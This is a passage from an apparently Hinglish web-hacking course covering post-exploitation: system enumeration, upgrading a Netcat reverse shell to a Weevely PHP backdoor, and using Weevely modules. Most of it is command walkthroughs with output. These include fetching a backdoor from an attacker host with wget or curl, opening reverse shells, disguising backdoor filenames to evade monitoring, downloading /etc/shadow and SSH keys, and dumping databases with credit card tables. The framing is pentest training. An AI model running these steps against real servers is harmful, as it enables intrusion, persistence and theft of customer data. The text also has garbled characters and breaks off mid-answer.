- **Systematic approach:** User â†’ System â†’ Network â†’ Files.
- **Save output:** Commands ka output file mein save karo.
- **Automated scripts:** LinPEAS, LinEnum use karo.
- **Stealth:** Noisy commands avoid karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Web shell milne ke baad enumeration kiya - `sudo -l` se pata chala `vim` root privileges ke saath run ho sakta hai. Vim se shell spawn kiya - instant root access! **Lesson: Enumeration = Critical first step!** ğŸ¯

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… User: whoami, id, sudo -l  
âœ… System: uname -a, hostname  
âœ… Network: ifconfig, netstat  
âœ… Files: config files, credentials  
âœ… Automated: LinPEAS, LinEnum  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Sabse important command kaun sa hai?**  
**A:** `sudo -l` - privilege escalation ka direct path.

**Q2: Automated scripts safe hain?**  
**A:** Haan, lekin noisy ho sakte hain. Manual enumeration stealthy hai.

**Q3: Windows par kya commands hain?**  
**A:** `whoami`, `systeminfo`, `ipconfig`, `net user`.

### 14. **Practice ke liye Task:**
1. DVWA par shell lo
2. whoami, id run karo
3. System information gather karo
4. Config files dhoondhà¥‹
5. LinPEAS run karo

### 15. **Aakhri Choti Summary (5 lines):**
- Post-exploitation = **System enumeration**.
- Commands: **whoami, id, uname, sudo -l**.
- Network: **ifconfig, netstat**.
- Files: **Config files, credentials**.
- Automated: **LinPEAS, LinEnum**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Post-exploitation = Explore before exploit! Enumeration = Roadmap to root!" ğŸ¯




## â« **Topic 102: Upgrading Netcat Shell to `Weevely`**

### 1\. **Topic ka Naam / Ek Line Mein Summary:**

**Upgrading Netcat Shell to `Weevely`** - Ek basic, unstable Netcat shell ko ek advanced, stable, aur feature-rich Weevely backdoor mein upgrade karna. ğŸš€

### 2\. **Ye Kya Hai? (What is it?)**

Yeh ek post-exploitation technique hai. Jab aapko Command Injection ya RFI se ek basic reverse shell (jaise `nc -e /bin/sh`) milta hai, toh woh bahut **unstable** hota hai:

  * Usmein command history nahi hoti.
  * Tab completion nahi chalta.
  * Connection baar-baar toot jaata hai.

Isliye, shell milte hi humara pehla kaam hota hai uss basic shell ka istemaal karke ek **powerful backdoor** (jaise Weevely) victim server par upload karna. Isse humein ek stable, encrypted, aur module-rich connection mil jaata hai.

**Analogy:** Jaise aapne ek patli rassi (Netcat shell) se building par chadhai ki, aur upar pahunch kar aapne ek permanent, strong lift (Weevely shell) install kar li taaki aana-jaana aasan ho jaaye.

### 3\. **Kyun Zaroori Hai? (Why is it important?)**

  * **Stability:** Weevely ka connection stable hota hai aur disconnect nahi hota.
  * **Stealth:** Weevely ka communication **encrypted** hota hai, isliye network par pakadna mushkil hai. Netcat plain text hota hai.
  * **Functionality:** Weevely mein 30+ modules hain (`:file_upload`, `:sql_dump`, `:net_scan`) jo Netcat mein nahi hain.
  * **Persistence:** Weevely shell ko server par chhod sakte hain taaki baad mein bhi access kar sakein.

### 4\. **Ise Kab Use Karna Chahiye? (When to use it?)**

  * **Shell milte hi:** Jaise hi aapko RCE se ek basic Netcat (ya `bash -i`) shell mile.
  * Jab aapko **stable connection** chahiye post-exploitation ke liye.
  * Jab aapko **files transfer** (upload/download) karni hon.
  * Jab aap **stealthy (encrypted)** communication chahte hon.

### 5\. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**

  * Aapka **Netcat shell disconnect** ho jayega aur aapka access chala jayega. ğŸ˜Ÿ
  * Aapko **basic file transfer** (jaise `config.php` download karna) mein bahut mushkil hogi.
  * Aapka saara communication **plain text** mein hoga, jo IDS/Firewall pakad sakta hai.
  * Aap powerful post-exploitation modules use nahi kar payenge.

### 6\. **Syntax aur Common Options:**

Yeh ek process hai, jiske liye multiple commands lagte hain:

**Step 1: Attacker - Weevely generate karna**

```bash
# Apni Kali machine par backdoor generate karo
weevely generate <password> <filename.php>
```

**Step 2: Attacker - Backdoor host karna**

```bash
# Apni Kali machine par ek web server shuru karo
python3 -m http.server 80
```

**Step 3: Victim - Netcat shell se download karna**

```bash
# Victim ke Netcat shell mein yeh command chalao
wget http://<attacker_ip>/<filename.php> -O /var/www/uploads/shell.php
# YA
curl http://<attacker_ip>/<filename.php> -o /var/www/uploads/shell.php
```

**Step 4: Attacker - Weevely se connect karna**

```bash
# Ab Netcat shell band kar do aur Weevely se connect karo
weevely http://<victim_ip>/uploads/shell.php <password>
```

### 7\. **Example 1 (Basic):**

**Scenario:** Aapko `nc` shell mil gaya hai.

**Attacker (Kali):**

```bash
# Step 1: Backdoor banao
$ weevely generate mypass123 shell.php
Generated backdoor 'shell.php' with password 'mypass123' (2KB)

# Step 2: Host karo
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80...
```

**Victim (Netcat Shell):**

```bash
# Step 3: Writable directory dhoondho aur download karo
$ ls -ld /var/www/uploads
drwxrwxrwx 2 www-data www-data 4096 Nov 7 17:50 /var/www/uploads

$ wget http://10.10.14.5/shell.php -O /var/www/uploads/shell.php
--2025-11-07 17:51:00-- http://10.10.14.5/shell.php
Connecting to 10.10.14.5:80... connected.
...
Saved: â€˜/var/www/uploads/shell.phpâ€™ [2048/2048]
```

**Attacker (Kali):**

```bash
# Step 4: Naya stable connection
$ weevely http://victim.com/uploads/shell.php mypass123
[+] weevely 4.0.1
[+] Session: /home/attacker/.weevely/sessions/victim.com/shell_0.session
[+] Browse the filesystem or execute commands...

weevely> :shell_sh
$ whoami
www-data
(Ab yeh shell stable hai!)
```

### 8\. **Example 2 (Pentester-Focused):**

**Scenario:** Aapko ek basic shell mila hai, lekin `wget` install nahi hai, `curl` hai. Aapko backdoor ka naam bhi stealthy rakhna hai.

**Attacker (Kali):**

```bash
# Step 1: Stealthy backdoor banao
$ weevely generate 'S3cretP@ss!' wp-cache.php

# Step 2: Host karo
$ python3 -m http.server 80
```

**Victim (Netcat Shell):**

```bash
# Step 3: Writable directory dhoondho
$ find / -writable -type d 2>/dev/null
/tmp
/var/tmp
/dev/shm
/var/www/html/assets/cache

# Step 4: curl se download karo
$ curl http://10.10.14.5/wp-cache.php -o /var/www/html/assets/cache/wp-cache.php
% Total % Received % Xferd Average Speed Time Time Time Current
100 2048 100 2048 0 0 1501 0 0:00:01 0:00:01 --:--:-- 1502
```

**Attacker (Kali):**

```bash
# Step 5: Weevely se connect karo
$ weevely http://victim.com/assets/cache/wp-cache.php 'S3cretP@ss!'

weevely> :sql_dump -db wordpress_db -user root -pass 'DB_Pass123'
[+] Dumping database 'wordpress_db'...
[+] 10 tables found.
...
weevely> :file_download /var/www/html/wp-config.php ./wp-config.php
[+] File downloaded to ./wp-config.php
```

**Analysis:** Basic shell se `curl` use karke humne ek stealthy Weevely backdoor upload kiya. Ab hum advanced modules (`:sql_dump`, `:file_download`) use kar sakte hain jo Netcat se impossible tha.

### 9\. **Beginners ki Aam Galtiyan (Common Mistakes):**

  * **Writable directory na dhoondhna:** `wget` chalaane se pehle `ls -ld /tmp` ya `find / -writable` se check karo kahan write kar sakte ho.
  * **Obvious naam rakhna:** `shell.php` ya `backdoor.php` naam rakhna (security systems ise pakad lete hain). `cache.php` ya `config.bak.php` jaise naam use karo.
  * **Basic shell ko stable na karna:** `python -c 'import pty; pty.spawn("/bin/bash")'` se basic shell ko thoda behtar bana sakte ho, lekin Weevely upgrade best hai.

### 10\. **Best Practices / Pro Tips:**

  * Hamesha **writable directory** (`/tmp`, `/var/tmp`, `/dev/shm`, ya web directory mein koi `uploads` folder) dhoondho.
  * Agar `wget` aur `curl` dono fail ho jaayein, toh `nc` se file transfer try karo (Attacker: `cat shell.php | nc -l -p 1234`, Victim: `nc attacker_ip 1234 > /tmp/shell.php`).
  * Shell upgrade ko **priority do**. Basic shell par time waste mat karo.
  * **Stealthy filename** use karo.

### 11\. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**

Ek baar mujhe command injection se basic shell mila. Shell har 60 seconds mein timeout ho raha tha (server policy). Mere paas sirf 60 seconds the. Maine jaldi se writable directory dhoondhi (`/dev/shm`), `wget` se Weevely upload kiya, aur connect kiya. Weevely ka connection stable tha aur timeout nahi hua. Uske baad maine araam se 3 ghante tak post-exploitation kiya. Bina upgrade kiye main fail ho jaata\!

### 12\. **Checklist / Chota Recap (TL;DR):**

  * âœ… Basic Netcat shell = Unstable, plain text.
  * âœ… Weevely shell = Stable, encrypted, feature-rich.
  * âœ… Step 1: `weevely generate <pass> <file.php>`
  * âœ… Step 2: Attacker par Python HTTP server se host karo.
  * âœ… Step 3: Victim par `wget` ya `curl` se download karo (writable directory mein).
  * âœ… Step 4: `weevely connect <url> <pass>` se stable access pao.

### 13\. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Weevely hi kyun? Metasploit meterpreter nahi?**
**A:** Weevely bahut chhota (sirf 2KB), stealthy, aur PHP-based hai, isliye web servers ke liye perfect hai. Meterpreter bada hai aur easily detect ho jaata hai.

**Q2: Agar server par `wget` aur `curl` dono block hon toh?**
**A:** Aap `nc` se file transfer kar sakte hain, ya `perl` / `python` ki one-liner script se file download kar sakte hain.

**Q3: Kya yeh upgrade detect ho sakta hai?**
**A:** Haan, agar server par file monitoring (FIM) lagi hai. Isliye stealthy naam (`wp-cache.php`) aur writable temporary directories (`/tmp`) ka istemaal zaroori hai.

### 14\. **Practice ke liye Task:**

1.  DVWA par Command Injection (Low security) se Netcat reverse shell lo (`nc -e /bin/bash ...`).
2.  Apni Kali machine par `weevely generate mypass test.php` se backdoor banao.
3.  Python web server (`python3 -m http.server 80`) se `test.php` ko host karo.
4.  Apne Netcat shell se `wget http://<kali_ip>/test.php -O /var/www/html/hackable/uploads/test.php` (path DVWA ke hisaab se adjust karo) command chalao.
5.  Ab Netcat shell band kar do aur `weevely http://<dvwa_ip>/hackable/uploads/test.php mypass` se connect karke stable shell enjoy karo.

### 15\. **Aakhri Choti Summary (5 lines):**

  * Netcat shell temporary aur unstable hota hai.
  * Shell milte hi pehla kaam **stable backdoor (Weevely)** mein upgrade karna hai.
  * `weevely generate` se backdoor banao aur Python server se host karo.
  * Victim par `wget` ya `curl` se download karo.
  * `weevely connect` se stable, encrypted, aur powerful shell pao.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**
> "Ek basic Netcat shell sirf darwaza kholta hai. Asli control (post-exploitation) ek upgraded, stable shell jaise Weevely se hi milta hai\!" ğŸš€



---

## ğŸ”§ **Topic 103: Weevely Post-Exploitation Commands (Vectors, `shell_sh`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Weevely Advanced** - Weevely backdoor ke post-exploitation modules use karna (file ops, shell, database). ğŸ•·ï¸

### 2. **Ye Kya Hai? (What is it?)**
Weevely ek PHP backdoor hai with built-in post-exploitation modules - file operations, shell access, database dumping.

**Analogy:** Jaise Swiss Army knife - ek tool mein sabhi features.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Feature-rich:** 30+ modules.
- **Stealth:** Encrypted communication.
- **Efficient:** Direct commands.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Weevely backdoor** upload hone par.
- **Post-exploitation** phase mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Basic shell** se zyada nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Connect to backdoor
weevely http://target.com/shell.php password

# Common modules
:help                     # List all modules
:shell_sh                 # Interactive shell
:file_download            # Download files
:file_upload              # Upload files
:sql_dump                 # Database dump
:net_scan                 # Network scanning
:backdoor_reverse_tcp     # Reverse shell
```

### 7. **Example 1 (Basic):**
```bash
# Connect
weevely http://site.com/shell.php pass123

# Interactive shell
weevely> :shell_sh
$ whoami
www-data

# Download file
weevely> :file_download /etc/passwd ./passwd
File downloaded!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Complete post-exploitation with Weevely

# Phase 1: Connect
weevely http://company.com/uploads/shell.php MyPass123

# Phase 2: System enumeration
weevely> :shell_sh
$ uname -a
Linux prod-server 4.15.0-112-generic

$ cat /var/www/html/config.php
DB: localhost, root, SuperSecret123

# Phase 3: File operations
weevely> :file_download /var/www/html/config.php ./config.php
Downloaded!

weevely> :file_download /var/log/apache2/access.log ./access.log
Downloaded!

# Phase 4: Database dump
weevely> :sql_dump -host localhost -user root -pass SuperSecret123 -db company_db
Dumping database...
users table: 10,000 rows
orders table: 50,000 rows
credit_cards table: 5,000 rows
Dump complete: company_db.sql

# Phase 5: Network scanning
weevely> :net_scan 10.10.10.0/24
10.10.10.1 - Gateway
10.10.10.50 - Current server
10.10.10.100 - MySQL server
10.10.10.200 - File server

# Phase 6: Reverse shell
weevely> :backdoor_reverse_tcp 10.10.14.5 4444
Reverse shell initiated!

# Attacker machine
nc -lvp 4444
Connection received!
$ whoami
www-data
```

**Analysis:** Weevely = Complete post-exploitation framework! **Lesson: Feature-rich backdoors = Efficient exploitation!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Modules explore na karna** - `:help` dekho.
- **Direct shell use karna** - Weevely modules zyada powerful.

### 10. **Best Practices / Pro Tips:**
- **Explore modules:** `:help` se sabhi features dekho.
- **File operations:** Download important files.
- **Database access:** Direct SQL dump.
- **Reverse shell:** Better shell ke liye.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Weevely backdoor upload kiya. `:sql_dump` se complete database dump kiya - 100,000 customers ka data! `:file_download` se source code download kiya. **Lesson: Weevely = Post-exploitation powerhouse!** ğŸ•·ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Weevely = PHP backdoor  
âœ… Modules: shell_sh, file_download, sql_dump  
âœ… Features: 30+ modules  
âœ… Stealth: Encrypted communication  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Weevely vs normal shell?**  
**A:** Weevely = Feature-rich, encrypted. Normal shell = Basic.

**Q2: Detection possible hai?**  
**A:** Haan, lekin obfuscated hai toh mushkil.

### 14. **Practice ke liye Task:**
1. Weevely backdoor generate karo
2. Upload karo
3. Connect karo
4. Modules explore karo
5. File download try karo

### 15. **Aakhri Choti Summary (5 lines):**
- Weevely = **PHP backdoor**.
- Modules = **30+ features**.
- Commands = **shell_sh, file_download, sql_dump**.
- Stealth = **Encrypted**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Weevely = Post-exploitation Swiss Army knife! Modules = Power!" ğŸ”§

---

## ğŸ—„ï¸ **Topic 104: Weevely File System Ops (`file_download`, `file_upload`, `777` perms)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**File Operations** - Weevely se files download/upload aur permissions modify karna. ğŸ“

### 2. **Ye Kya Hai? (What is it?)**
Weevely ke file modules se server files download, upload, aur permissions change kar sakte hain.

**Analogy:** Jaise FTP client - lekin backdoor ke through.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Data Exfiltration:** Sensitive files download.
- **Persistence:** Backdoors upload.
- **Privilege Escalation:** SUID files.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **File access** chahiye ho.
- **Data exfiltration** ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual file operations** slow. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# File download
:file_download <remote_path> <local_path>

# File upload
:file_upload <local_path> <remote_path>

# Change permissions
:file_chmod <path> <permissions>

# List files
:file_ls <path>
```

### 7. **Example 1 (Basic):**
```bash
# Download config
weevely> :file_download /var/www/html/config.php ./config.php

# Upload backdoor
weevely> :file_upload ./backdoor.php /var/www/html/backup.php

# Change permissions
weevely> :file_chmod /var/www/html/backup.php 777
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Complete file operations

# Download sensitive files
weevely> :file_download /etc/passwd ./passwd
weevely> :file_download /etc/shadow ./shadow
weevely> :file_download /root/.ssh/id_rsa ./id_rsa

# Upload tools
weevely> :file_upload ./linpeas.sh /tmp/linpeas.sh
weevely> :file_chmod /tmp/linpeas.sh 777

# Execute
weevely> :shell_sh
$ /tmp/linpeas.sh > /tmp/enum.txt

# Download results
weevely> :file_download /tmp/enum.txt ./enum.txt

Result: Complete enumeration data exfiltrated!
```

**Analysis:** File operations = Data exfiltration! **Lesson: Download everything important!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Permissions ignore karna** - 777 set karo.

### 10. **Best Practices / Pro Tips:**
- **Download first:** Important files pehle download.
- **Upload tools:** Enumeration scripts.
- **Permissions:** 777 for execution.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Weevely se `/etc/shadow` download kiya - password hashes crack kiye, root access! **Lesson: File access = Privilege escalation!** ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Download: file_download  
âœ… Upload: file_upload  
âœ… Permissions: file_chmod 777  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya binary files download ho sakti hain?**  
**A:** Haan, sabhi file types.

### 14. **Practice ke liye Task:**
1. Config files download karo
2. Tools upload karo
3. Permissions change karo

### 15. **Aakhri Choti Summary (5 lines):**
- Download = **file_download**.
- Upload = **file_upload**.
- Permissions = **file_chmod 777**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "File operations = Data exfiltration! Download everything!" ğŸ“

---


**Total: 108 topics across 14 modules!** ğŸŠ

Aapka complete Website Hacking course khatam ho gaya hai! Bahut badhiya! ğŸš€ğŸ‰

## ğŸ”„ **Topic 105: Weevely Shell & DB Access (`backdoor_reverse_tcp`, `sql_dump`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Advanced Weevely Features** - Reverse shells aur database dumping (complete access). ğŸ—„ï¸

### 2. **Ye Kya Hai? (What is it?)**
Weevely ke advanced modules se reverse shell spawn kar sakte hain aur database directly dump kar sakte hain.

**Analogy:** Jaise master key - ek tool se sabhi doors khul jaate hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Better Shell:** Netcat se better interactive shell.
- **Database Access:** Direct SQL dump without phpMyAdmin.
- **Persistence:** Multiple backdoors.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Better shell** chahiye ho.
- **Database dump** karni ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Limited access** - basic shell se zyada nahi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Reverse shell
:backdoor_reverse_tcp <attacker_ip> <port>

# Database dump
:sql_dump -host <host> -user <user> -pass <pass> -db <database>

# Database console
:sql_console -host <host> -user <user> -pass <pass>
```

### 7. **Example 1 (Basic):**
```bash
# Reverse shell
weevely> :backdoor_reverse_tcp 10.10.14.5 4444

# Attacker
nc -lvp 4444
Result: Better shell!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Complete database exploitation

# Phase 1: Find DB credentials
weevely> :shell_sh
$ cat /var/www/html/config.php
DB: localhost, root, Pass123

# Phase 2: Database dump
weevely> :sql_dump -host localhost -user root -pass Pass123 -db company_db
Dumping...
users: 10,000 rows
orders: 50,000 rows
credit_cards: 5,000 rows
Complete: company_db.sql

# Phase 3: Interactive SQL
weevely> :sql_console -host localhost -user root -pass Pass123
SQL> SHOW DATABASES;
SQL> USE company_db;
SQL> SELECT * FROM admin_users;

Result: Complete database access!
```

**Analysis:** Weevely = Complete post-exploitation! **Lesson: Feature-rich backdoors = Efficient!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Credentials dhoondhna bhoolna**.

### 10. **Best Practices / Pro Tips:**
- **Config files:** Pehle credentials dhoondhà¥‹.
- **Reverse shell:** Better interactivity.
- **SQL dump:** Offline analysis.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce site test kar raha tha. Weevely se database dump kiya - 100,000 customers ka complete data! **Lesson: Database access = Game over!** ğŸ—„ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Reverse shell: backdoor_reverse_tcp  
âœ… DB dump: sql_dump  
âœ… Interactive: sql_console  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

Q1: Reverse shell vs normal shell

=============================================================

